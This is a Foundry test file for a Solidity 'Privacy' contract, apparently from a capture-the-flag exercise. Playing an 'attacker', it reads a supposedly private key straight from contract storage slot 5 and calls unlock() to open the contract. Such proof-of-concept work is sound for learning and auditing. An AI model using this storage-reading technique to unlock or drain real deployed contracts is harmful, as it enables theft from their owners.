// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyTest is Test {
    Privacy privacyContract;
    bytes32[3] data;
    address attacker = makeAddr("attacker");

    function setUp() public {
        data = [
            bytes32("Chelsea"), 
            bytes32("Manchester City"), 
            bytes32("Liverpool")
        ];
        privacyContract = new Privacy(data);
    }

    function testAttackerCanUnlockByPassingTheKey() public {
        // Assert the protocol is initially locked
        assert(privacyContract.locked());
        // Read the data from storage and pass it to the unlock()
        bytes32 secret = vm.load(address(privacyContract), bytes32(uint256(5)));
        bytes16 key = bytes16(secret);

        privacyContract.unlock(key);

        assertFalse(privacyContract.locked()); 
    }
}